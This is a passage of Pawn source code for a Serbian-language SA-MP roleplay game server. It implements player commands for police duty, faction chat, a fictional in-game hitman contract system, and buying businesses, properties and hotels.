		    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
		        if( igrac == DragedPlayerID[ playerid ] ) {
					format( globalstring, sizeof( globalstring ), "%s vas je pustio.", ImeIgraca( playerid ) );
					SCM( igrac, -1, globalstring );
					format( globalstring, sizeof( globalstring ), "Pustili ste %s.", ImeIgraca( igrac ) );
					SCM( playerid, -1, globalstring );
					Novi_KillTimer( DragTimer[ playerid ] );
					DragedPlayerID[ playerid ] = -1;
					Draged[ igrac ] = -1;
				} else return SendErrorMessage( playerid, "Ne vucete tog igraca.");
			} else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	} else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return true;
}

CMD:pokaziznacku( playerid, params[] ) {
	new id = PlayerInfo[ playerid ][ xClan ], igrac;
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false )  return SendErrorMessage( playerid, "Niste na duznosti tako da nemate znacku kod sebe." );
    if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/pokaziznacku [ ID/Deo Imena ]");
		return 1;
	}
	if( igrac != INVALID_PLAYER_ID ) {
		if( IsPlayerConnected( igrac ) ) {
			if( IsPlayerNearPlayer( 3.0, playerid, igrac ) ) {

				format( globalstring, sizeof( globalstring ), "* %s je %s %s.", ImeIgraca( playerid ), OI[ id ][ oPreFix ], getOrgRank( playerid, id ) );
				SCM( igrac, 0x00D900C8, globalstring );
				
                format( globalstring, sizeof( globalstring ), "* %s podize ruku i pokazuje svoju znacku %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
                PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
                
                //SetPlayerAttachedObject( playerid, OBJECT_SLOT_BADGE, 1247, 6, 0.1, 0.05, 0, 0, 0, 0, 0.5, 0.5, 0.5 );
                SetTimerEx( "RemoveBadge", 3000, 0, "i", playerid );
			    ApplyAnimation( playerid, "DEALER", "shop_pay", 4.1, 0, 0, 0, 0, 0 );
			    
			} else SendErrorMessage( playerid, "Taj igrac nije blizu tebe !");
		}
	}
	return true;
}

CMD:duty( playerid, params[] ) {
	new id = PlayerInfo[ playerid ][ xClan ];
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na pickupu za koriscenje ove komande." );
    if( PlayerInfo[ playerid ][ xRank ] == 0 ) return SendErrorMessage( playerid, "Suspendovani ste." );
	if( PoliceDuty[ playerid ] == false ) {
		PoliceDuty[ playerid ] = true;
		format( globalstring, sizeof( globalstring ), "HQ: %s je sada na duznosti.", ImeIgraca( playerid ) );
		OrgPoruka( id, 0x2641FEAA, globalstring );
		format( globalstring, sizeof( globalstring ), "* %s %s uzima znacku i opremu iz ormarica.", getOrgRank( playerid, PlayerInfo[ playerid ][ xClan ] ), ImeIgraca( playerid ) );
		PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		SetPlayerColor( playerid, 0x0096FFFF );
	}
	else if( PoliceDuty[ playerid ] == true ) {
	    PoliceDuty[ playerid ] = false;
		ResetAllWeapons( playerid );
		Novi_SetPlayerArmour( playerid, 0 );
		BrojLisica[ playerid ] = 0;
		Novi_SetPlayerArmour( playerid, 0 );
		Novi_SetPlayerHealth( playerid, 75 );
		PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
		
		format( globalstring, sizeof( globalstring ), "* %s vraca znacku i opremu u ormaric.", ImeIgraca( playerid ) );
		PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
		SetPlayerColor( playerid, 0xFFFFFF00 );
	}
	return true;
}

alias:computer("mdc");
CMD:computer( playerid, params[] ) {
    //new vehicleid = GetPlayerVehicleID( playerid ), string[ 128 ];
    new string[128];
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( IsPlayerInRangeOfPoint( playerid, 2, 664.7603,2553.5720,-89.4551 ) ) {
	    if( GetPVarInt( playerid, "Computer" ) == 0 ) {

			Police_TVTDControl( playerid, true );

			SelectTextDraw( playerid, 0x5D9FCEFF );

			SetPVarInt( playerid, "Computer", 1 );
			SCM( playerid, BELA, "Koristite /computer da bi ugasili racunalo." );
			
			format( string, sizeof string, "%s se logovao na %s laptop.", ImeIgraca( playerid ), OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
			OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, string );
			return true;
		}
		if( GetPVarInt( playerid, "Computer" ) == 1 ) {

			Police_TVTDControl( playerid, false );

			CancelSelectTextDraw( playerid );
			SetPVarInt( playerid, "Computer", 0 );
			format( string, sizeof string, "%s se izlogovao na %s laptop.", ImeIgraca( playerid ), OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
			OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, string );
			return true;
		}
	}
	// else {
 //        if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
	// 		if( GetPVarInt( playerid, "Computer" ) == 0 ) {

	// 			Police_TVTDControl( playerid, true );

	// 			SelectTextDraw( playerid, 0x5D9FCEFF );

	// 			SetPVarInt( playerid, "Computer", 1 );
	// 			SCM( playerid, BELA, "Koristite /computer da bi ugasili racunalo." );
	// 			return true;
	// 		}
	// 		if( GetPVarInt( playerid, "Computer" ) == 1 ) {

	// 			Police_TVTDControl( playerid, false );

	// 			CancelSelectTextDraw( playerid );
	// 			SetPVarInt( playerid, "Computer", 0 );
	// 			return true;
	// 		}
	// 	} else SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u vozilu policije/racunar u stanici" );
	// }
	return true;
}

CMD:d( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u zatvoru / Area51.");
	new poruka[ 128 ], string[ 234 ];
	if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if(sscanf(params, "s[128]", poruka)) return SendUsageMessage( playerid, "/d [Text]");
	if( GetFactionType( playerid )  != ORG_TIP_PD && GetFactionType( playerid )  != ORG_TIP_MD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    for( new id = 1; id < MAX_ORG; id++) {
		if( OI[ id ][ oTip ] == ORG_TIP_PD || OI[ id ][ oTip ] == ORG_TIP_MD ) {
			if( PlayerInfo[ playerid ][ xRank ] == 1) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), poruka );
			else if( PlayerInfo[ playerid ][ xRank ] == 2) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), poruka );
			else if( PlayerInfo[ playerid ][ xRank ] == 3) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), poruka );
			else if( PlayerInfo[ playerid ][ xRank ] == 4) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), poruka );
			else if( PlayerInfo[ playerid ][ xRank ] == 5) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), poruka );
			else if( PlayerInfo[ playerid ][ xRank ] == 6) format(string, sizeof string, "** [%s]%s %s: %s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), poruka );
            OrgPoruka1( id, 0xB3ADADFF, string );
		}
	}
	return true;
}

CMD:r( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u zatvoru / Area51.");
	new poruka[ 128 ], string[ 234 ];
	if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if(sscanf(params, "s[128]", poruka)) return SendUsageMessage( playerid, "/r [Text]");
	if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );

	if( PlayerInfo[ playerid ][ xRank ] == 1) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), poruka );
	else if( PlayerInfo[ playerid ][ xRank ] == 2) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), poruka );
	else if( PlayerInfo[ playerid ][ xRank ] == 3) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), poruka );
	else if( PlayerInfo[ playerid ][ xRank ] == 4) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), poruka );
	else if( PlayerInfo[ playerid ][ xRank ] == 5) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), poruka );
	else if( PlayerInfo[ playerid ][ xRank ] == 6) format(string, sizeof string, "** %s %s %s: "col_white"%s, prijem. **", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), poruka );
	OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, string );

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( poruka, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, poruka );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}
	return true;
}

CMD:hitman( playerid, params[] ) {
	if( IsPlayerConnected( playerid ) ) {
		if( GetFactionType( playerid )  != ORG_TIP_HITM ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
        SPD( playerid, dialog_PORTABLE, DSL, D_NASLOV, "Kontrakti\nDaj metu\nRankovi\nNaruci", D_ODABERI, D_ODUSTANI );
	}
	return 1;
}

CMD:lociraj( playerid, params[] ) {

	if( CheckpointStatus[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas checkpoint aktiviram tako da ne mozes ovo koristiti." );

	if( IsPlayerConnected( playerid ) ) {
	
	    if( GetFactionType( playerid ) == ORG_TIP_HITM || GetFactionType( playerid ) == ORG_TIP_PD || GetFactionType( playerid ) == ORG_TIP_MD ) {

		    if( CheckpointStatus[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas jedan upaljen CP, prvo ga ugasi /gpsoff." );

			if( SearchNadji[ playerid ] != -1 ) {
			    SearchNadji[ playerid ] = -1;
			    Novi_DisablePlayerCheckpoint( playerid);
			}
			else if( SearchNadji[ playerid ] == -1 ) {
			
				new broj;
				if( sscanf( params, "i", broj ) ) return SendUsageMessage( playerid, "/lociraj [ ID ]");
				if(!IsPlayerConnected(broj)) return SendErrorMessage(playerid, "Igrac nije online!");
                if(PlayerInfo[broj][xWanted] < 1) return SendErrorMessage(playerid, "Igrac nema wanted!");
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos( broj, X, Y, Z );
				Novi_SetPlayerCheckpoint( playerid, X, Y, Z, 6 );
				SearchNadji[ playerid ] = broj;
				return 1;


			}

		}
		else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	}
	return true;
}

CMD:naruciubistvo( playerid, params[] ) {
    if( IsPlayerConnected( playerid ) ) {
        new ID, amount;
		if( sscanf(params,"ui", ID, amount)) return SendUsageMessage( playerid, "/naruciubistvo [ID Igraca/Deo Imena] [ novac ]");
        if( ID == INVALID_PLAYER_ID ) return SendErrorMessage(playerid, "Pogresan ID!");
        if( amount < 1000 || amount > 200000 ) return SendErrorMessage( playerid, "Cena mete mora biti minimum $1000, ili maksimum $200000!");
        if( amount > PlayerInfo[ playerid ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca sa sobom.");
		if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5." );
		if( PlayerInfo[ ID ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5." );
		if( PlayerInfo[ ID ][ xAdmin ] >= 1  ) return SendErrorMessage( playerid, "Ne mozete to uraditi na Admin TEAM." );
        if( PlayerInfo[ ID ][ xSupporter ] >= 1  ) return SendErrorMessage( playerid, "Ne mozete na Helperima." );
		if( IsPlayerConnected( ID ) ){
            if( ID != INVALID_PLAYER_ID ) {
                if( OI[ PlayerInfo[ ID ][ xClan ] ][ oTip ] == ORG_TIP_HITM ) return SendErrorMessage( playerid, "* Ne mozete naruciti ubistvo clanova agencije !");
			    if( ID == playerid ) return SendErrorMessage( playerid, "* Ne mozete naruciti svoje ubistvo!");

                if( amount > 0 && PlayerInfo[ playerid ][ xNovac ] >= amount ) {
                    DajIgracuNovac( playerid, -amount );
                    PlayerInfo[ ID ][ xHitmenCena ] += amount;
                    format( globalstring, sizeof( globalstring ), "* Narucili ste ubistvo %s-a, za "col_white"$%d.",ImeIgraca( ID ), amount);
                    SCM(playerid, BELA, globalstring );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );
                    for( new id = 1; id < MAX_ORG; id++) {
		    			if( OI[ id ][ oTip ] == ORG_TIP_HITM ) {
		    			    format( globalstring, sizeof( globalstring ), "%s je narucio ubistvo %s-a, za $%d.", ImeIgraca( playerid ), ImeIgraca( ID ), amount);
                    		OrgPoruka( id, ZUTA, globalstring );
						}
					}
                }
                else {
                    SendErrorMessage( playerid, "Nepravilan iznos transakcije.");
                }
            }
        }
        else {
            SendErrorMessage( playerid, "Pogresan ID" );
        }
    }
    return 1;
}

CMD:clanovi( playerid, params[] ) {
    new string[ 128 ], OrgID;
	if( PlayerInfo[ playerid ][ xClan ] != 0 ) OrgID = PlayerInfo[ playerid ][ xClan ];
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu!");
	SCM( playerid, NARANDZASTA, "|----------------Clanovi Online----------------|");
	foreach( Player, i) {
	    if( IsPlayerConnected( i ) && PlayerLogged[ i ] == true && PlayerInfo[ i ][ xClan ] == OrgID ) {
			format( string, sizeof( string ), "%s[%d] | %s ", getOrgRank( i, PlayerInfo[ i ][ xClan ] ), PlayerInfo[ i ][ xRank ], ImeIgraca( i ));
			SCM( playerid, NARANDZASTA, string);
		}
	}
	return true;
}

CMD:f( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    // if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u zatvoru / Area51.");
	new poruka[ 128 ], string[ 234 ];
	if( sscanf(params, "s[128]", poruka)) return SendUsageMessage( playerid, "/f [Text]");
    for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( poruka, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, poruka );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 1;
        }
	}
	if( PlayerInfo[ playerid ][ xLider ] > 0 || PlayerInfo[ playerid ][ xClan ] > 0) {
		if( PlayerInfo[ playerid ][ xRank ] == 1) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), poruka );
	    else if( PlayerInfo[ playerid ][ xRank ] == 2) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), poruka );
	    else if( PlayerInfo[ playerid ][ xRank ] == 3) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), poruka );
	    else if( PlayerInfo[ playerid ][ xRank ] == 4) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), poruka );
	    else if( PlayerInfo[ playerid ][ xRank ] == 5) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), poruka );
	    else if( PlayerInfo[ playerid ][ xRank ] == 6) format(string, sizeof string, "[%s] %s %s: "col_white"%s.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], OI[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), poruka );
	    OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, string ); }
    else { SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" ); return true; }
	return true;
}

// Firma System

CMD:kupifirmu( playerid, params[] ) {
	new id = GetNearestBussines( playerid );
	if( id == -1 || id == 0 ) return SendErrorMessage( playerid, "Niste blizu firme!" );
	if( BussinesInfo[ id ][ bOwned ] != 0 || BussinesInfo[ id ][ bPrice ] == 0) return SendErrorMessage( playerid, "Ova firma se ne prodaje!");
	if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes firmu!");
    if(BussinesInfo[id][bType] == VRSTA_PRAZANLOKAL) return SendErrorMessage(playerid, "Za kupovinu lokala koristi /kupilokal");
    if(BussinesInfo[id][bType] == VRSTA_CASINO) return SendErrorMessage(playerid, "Ovo je donatorska firma!");
    if(BussinesInfo[id][bType] == VRSTA_POSAO) return SendErrorMessage(playerid, "Ovo je donatorska firma!");
	if( PlayerInfo[ playerid ][ xNovac ] < BussinesInfo[ id ][ bPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za kupovinu Firme!");
    if( PlayerInfo[ playerid ][ xLevel ] < BussinesInfo[ id ][ bLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Morate biti level %d+ da bi ste kupili firmu.", BussinesInfo[ id ][ bLevel ] );
	PlayerInfo[ playerid ][ xFirmaID ] = id;
	DajIgracuNovac( playerid, -BussinesInfo[ id ][bPrice] );
	BussinesInfo[ id ][ bLocked ] = 0;
	BussinesInfo[ id ][ bNeaktivnost ] = 0;
	BussinesInfo[ id ][ bOwned ] = 1;
	strmid( BussinesInfo[ id ][ bOwner], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
	Bussines_Refresh( id );
	SaveBussines( id );
	SavePlayer( playerid );
	SendInfoMessage( playerid, "Kupili ste firmu, cestitamo!" );

    if(PlayerInfo[playerid][xAchivements][11] == 0) {

        achivementPassed(playerid, 11, 5000);
    }

	return true;
}

CMD:kupilokal(playerid) {

    new idFirme = GetNearestBussines(playerid);
    if( idFirme == -1 || idFirme == 0 ) return SendErrorMessage( playerid, "Niste blizu firme!" );
    if( BussinesInfo[ idFirme ][ bType ] != VRSTA_PRAZANLOKAL) return SendErrorMessage(playerid, "Ovo nije prazan lokal!");
    if( BussinesInfo[ idFirme ][ bOwned ] != 0 || BussinesInfo[ idFirme ][ bPrice ] == 0) return SendErrorMessage( playerid, "Ova firma se ne prodaje!");
    if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes firmu!");
    if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes to iz vozila!");

    ShowPlayerDialog(playerid, dialog_LokalKupi, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
    "Naziv\tCena\tLevel\n\
    Market\t1000000$\t10\n\
    Burg\t500000$\t5\n\
    Clucking Bell\t5000$\t5\n\
    Binco\t650000$\t6\n\
    Bar\t300000$\t8\n\
    Mali Restoran\t600000$\t5\n\
    Veliki Restoran\t800000$\t8\n\
    GunShop\t1500000$\t12", D_ODABERI, D_ODUSTANI);

    return 1;
} 

CMD:firma( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujete firmu!" );
	if( strcmp( ImeIgraca( playerid ), BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bOwner ], true) == 0 ) {

		SPD( playerid, dialog_FIRMA, DSL, D_NASLOV, "Informacije\nPromeni Ime\nZakljucaj/Otkljucaj Firmu\nPodigni Novac\nOstavi Novac\nNaruci Produkte\n{F81414}Prodaj Drzavi\n{F81414}Prodaj Igracu", D_ODABERI, D_ODUSTANI );
	} else {
	
		SCM( playerid, ANTICHEAT, "| V:AC | Ova firma nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
	}
	return true;
}

CMD:imovina( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od imovine!");
	SPD( playerid, dialog_PROPERTYLIST, DSL, D_NASLOV, "Imovina 1\nImovina 2\nImovina 3", D_ODABERI, D_ODUSTANI );
	return 1;
}

CMD:kupiimovinu( playerid, params[] ) {
    if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes 3 kuce/stana/vikendice!");
 	if( PlayerInfo[ playerid ][ xNovac ] < II[ GetNearestProperty( playerid ) ][ iPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca!" );
	if( II[ GetNearestProperty( playerid ) ][ iOwned ] != 0 ) return SendClientMessageEx( playerid, CRVENA, "Ova %s nije na prodaju.",GetPropertyAName( GetNearestProperty( playerid ) ) );

    if( PlayerInfo[ playerid ][ xLevel ] < II[ GetNearestProperty( playerid ) ][ iLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Da bi ste kupili ovu imovinu morate biti level %d+.", II[ GetNearestProperty( playerid ) ][ iLevel ] );

	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = GetNearestProperty( playerid );}
	else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = GetNearestProperty( playerid ); }
	else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = GetNearestProperty( playerid ); }

	DajIgracuNovac( playerid, -II[ GetNearestProperty( playerid ) ][ iPrice ] );
	II[ GetNearestProperty( playerid ) ][ iOwned ] = 1;
	II[ GetNearestProperty( playerid ) ][ iNeaktivnost ] = 0;
	strmid( II[ GetNearestProperty( playerid ) ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255 );
    PlayerPlaySound( playerid, 1058, 0, 0, 0 );
    SendClientMessageEx( playerid, SRVBOJA1, "Kupili ste %s.", GetPropertyName( GetNearestProperty( playerid ) ) );
    SavePlayer( playerid ); PropertyRefresh( GetNearestProperty( playerid ) ); SaveProperty( GetNearestProperty( playerid ) );

    if(PlayerInfo[playerid][xAchivements][9] == 0) {

        achivementPassed(playerid, 9, 5000);
    }

	return 1;
}

CMD:kupihotel( playerid, params[] ) {
    if( GetNearestHotel( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema hotela u vasoj blizini!" );
    if( PlayerInfo[ playerid ][ xHotelID ] != -1  ) return SendErrorMessage( playerid, "Vec posedujes hotel!");
 	if( PlayerInfo[ playerid ][ xNovac ] < hotelInfo[ GetNearestHotel( playerid ) ][ hPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca!" );
	if( hotelInfo[ GetNearestHotel( playerid ) ][ hOwned ] != 0 ) return SendErrorMessage( playerid, "Ovaj hotel nije na prodaju." );
    if( PlayerInfo[ playerid ][ xLevel ] < hotelInfo[ GetNearestHotel( playerid ) ][ hLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Da bi ste kupili ovaj hotel morate biti level %d+.", hotelInfo[ GetNearestHotel( playerid ) ][ hLevel ] );

	PlayerInfo[ playerid ][ xHotelID ] = GetNearestHotel( playerid );
	DajIgracuNovac( playerid, -hotelInfo[ GetNearestHotel( playerid ) ][ hPrice ] );
    hotelInfo[ GetNearestHotel( playerid ) ][ hPorez ] = 0; hotelInfo[ GetNearestHotel( playerid ) ][ hVrednostPoreza ] = 0;
	hotelInfo[ GetNearestHotel( playerid ) ][ hOwned ] = 1;
	strmid( hotelInfo[ GetNearestHotel( playerid ) ][ hOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255 );
    PlayerPlaySound( playerid, 1058, 0, 0, 0 );
    SCM( playerid, SRVBOJA1, "Kupili ste hotel." );
    SavePlayer( playerid ); HotelRefresh( GetNearestHotel( playerid ) ); SaveHotel( GetNearestHotel( playerid ) );
	return 1;
}

CMD:hotel( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xHotelID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujete hotel!" );
	if( strcmp( ImeIgraca( playerid ), hotelInfo[ PlayerInfo[ playerid ][ xHotelID ] ][ hOwner ], true) == 0 ) {
		SPD( playerid, dialog_HOTEL, DSL, D_NASLOV, "Informacije\nNajam\nIzbaci gosta\nPodigni Novac\nOstavi Novac\nOtkljucaj/Zakljucaj\n{F81414}Prodaj Drzavi\n{F81414}Prodaj Igracu", D_ODABERI, D_ODUSTANI );
	} else SendErrorMessage( playerid, "Ovo nije vas hotel.." );
	return true;
}

CMD:iznajmisobu( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xHotelRoom ] != -1 ) return SendErrorMessage( playerid, "Vec imas iznajmljenu sobu." );
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 2217.3083, -1146.4053, 1025.7969 ) ) return SendErrorMessage( playerid, "Nisi na salteru u hotelu." );
    if( inHotel[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nisi na salteru u hotelu." );
    if( PlayerInfo[ playerid ][ xNovac ] < hotelInfo[ inHotel[ playerid ] ][ hRoomPrice ] ) return SendClientMessageEx( playerid, -1, "Nemate dovoljno novca(%d$) za najam.", hotelInfo[ inHotel[ playerid ] ][ hRoomPrice ] );
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Da bi rentao sobu moras biti level 2+." );

	new hid = inHotel[ playerid ];
    if( !strcmp( hotelInfo[ hid ][ hGuest_1 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_1 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
